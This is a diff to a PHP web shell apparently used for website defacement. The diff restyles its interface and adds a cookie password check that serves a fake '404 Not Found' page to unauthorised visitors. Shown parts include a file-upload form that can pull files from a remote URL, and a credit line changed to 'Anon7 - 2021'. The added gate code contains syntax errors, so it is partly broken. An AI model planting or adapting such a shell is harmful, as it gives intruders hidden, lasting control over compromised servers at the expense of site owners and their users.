@@ -1,99 +1,116 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>.</title>
+    <title>.</title>
 </head>
-<body bgcolor="#1f1f1f" text="#ffffff">
-<link href="" rel="stylesheet" type="text/css">
-<style>
-	@import url('https://fonts.googleapis.com/css?family=Dosis');
-	@import url('https://fonts.googleapis.com/css?family=Bungee');
-body {
-	font-family: "Dosis", cursive;
-	text-shadow:0px 0px 1px #757575;
-}
+<body style="background-color: #1f1f1f; color: #00ff00;">
+    <style>
+        @import url('https://fonts.googleapis.com/css?family=Dosis');
+        @import url('https://fonts.googleapis.com/css?family=Bungee');
+        body {
+            font-family: "Dosis", cursive;
+            text-shadow: 0px 0px 1px #757575;
+        }
 
-#content tr:hover {
-	background-color: #636263;
-	text-shadow:0px 0px 10px #fff;
-}
+        #content tr:hover {
+            background-color: #636263;
+            text-shadow: 0px 0px 10px #fff;
+        }
 
-#content .first {
-	background-color: #25383C;
-}
+        #content .first {
+            background-color: #25383C;
+        }
 
-#content .first:hover {
-	background-color: #25383C
-	text-shadow:0px 0px 1px #757575;
-}
+        #content .first:hover {
+            background-color: #25383C;
+            text-shadow: 0px 0px 1px #757575;
+        }
 
-table {
-	border: 1px #000000 dotted;
-	table-layout: fixed;
-}
+        table {
+            border: 1px #00ff00 dotted;
+            table-layout: fixed;
+        }
 
-td {
-	word-wrap: break-word;
-}
+        td {
+            word-wrap: break-word;
+        }
 
-a {
-	color: #ffffff;
-	text-decoration: none;
-}
+        a {
+            color: #00ff00;
+            text-decoration: none;
+        }
 
-a:hover {
-	color: #000000;
-	text-shadow:0px 0px 10px #ffffff;
-}
+        a:hover {
+            color: #000000;
+            text-shadow: 0px 0px 10px #00ff00;
+        }
 
-input,select,textarea {
-	border: 1px #000000 solid;
-	-moz-border-radius: 5px;
-	-webkit-border-radius:5px;
-	border-radius:5px;
-}
+        input, select, textarea {
+            border: 1px #00ff00 solid;
+            -moz-border-radius: 5px;
+            -webkit-border-radius: 5px;
+            border-radius: 5px;
+        }
 
-.gas {
-	background-color: #1f1f1f;
-	color: #ffffff;
-	cursor: pointer;
-}
+        .gas {
+            background-color: #1f1f1f;
+            color: #00ff00;
+            cursor: pointer;
+        }
 
-select {
-	background-color: transparent;
-	color: #ffffff;
-}
+        select {
+            background-color: transparent;
+            color: #00ff00;
+        }
 
-select:after {
-	cursor: pointer;
-}
+        select:after {
+            cursor: pointer;
+        }
 
-.linka {
-	background-color: transparent;
-	color: #ffffff;
-}
+        .linka {
+            background-color: transparent;
+            color: #00ff00;
+        }
 
-.up {
-	background-color: transparent;
-	color: #fff;
-}
+        .up {
+            background-color: transparent;
+            color: #00ff00;
+        }
 
-option {
-	background-color: #1f1f1f;
-}
+        option {
+            background-color: #1f1f1f;
+        }
 
-::-webkit-file-upload-button {
-  background: transparent;
-  color: #fff;
-  border-color: #fff;
-  cursor: pointer;
-}
-</style>
-<center>
-<font face="Bungee" size="5">KGRKJGETMRETU895U-589TY5MIGM5JGB5SDFESFREWTGR54TY</font></center>
-<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">
-<tr><td>
+        ::-webkit-file-upload-button {
+            background: transparent;
+            color: #00ff00;
+            border-color: #00ff00;
+            cursor: pointer;
+        }
+    </style>
+    <center>
+        <font face="Bungee" size="5" color="#00ff00">KGRKJGETMRETU895U-589TY5MIGM5JGB5SDFESFREWTGR54TY</font>
+    </center>
+    <table width="700" border="0" cellpadding="3" cellspacing="1" align="center" style="background-color: #1f1f1f; color: #00ff00;">
+        <tr>
+            <td>
 <?php
+$s_show = ""; md5(password)
+
+if(!isset($_COOKIE['show'])) {
+setcookie("show","null",time() 3600);
+}
+
+if(kript($_COOKIE['show']) == $s_show) {
+setcookie("show",md5($_SERVER['HTTP_USER_AGENT'].md5($_COOKIE['show']).$_SERVER['SCRIPT_NAME']),time() + 3600);
+} else {
+if($_COOKIE['show'] != md5($_SERVER['HTTP_USER_AGENT'].$s_show.$_SERVER['SCRIPT_NAME'])) {
+?>
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"> <html><head> <title>404 Not Found</title> </head><body> <h1>Not Found</h1> <p>The requested URL <?php echo $_SERVER['SCRIPT_NAME'];?> was not found on this server.</p> <hr> <address><?php echo $_SERVER['SERVER_SOFTWARE'];?> Server at <?php echo $_SERVER['HTTP_HOST']; ?> Port <?php echo $_SERVER['SERVER_PORT'];?></address> </body></html>
+<?php
+exit;
+}} 
+
 set_time_limit(0);
 error_reporting(0);
 
@@ -105,7 +122,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-	echo "<center><br>ALL OF DEFACER - 2021</center>";
+	echo "<center><br>Anon7 - 2021</center>";
 	exit();
 }
 
@@ -227,7 +244,7 @@ echo '<form enctype="multipart/form-data" method="post">
 <br>
 <input type="hidden" name="upwkwk" value="aplod">
 <input type="file" name="berkas"><input type="submit" name="berkasnya" value="Upload" class="up" style="cursor: pointer; border-color: #fff"><br>
-<input type="text" name="darilink" class="up" placeholder="https://rhysyst9.com/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
+<input type="text" name="darilink" class="up" placeholder="https://anon7.xyz/upload.txt">&nbsp;<input type="text" name="namalink" class="up" size="3" placeholder="file.txt"><input type="submit" name="linknya" class="up" value="Upload" style="cursor: pointer; border-color: #fff">
 </form>';
 echo "</table><br>";
 
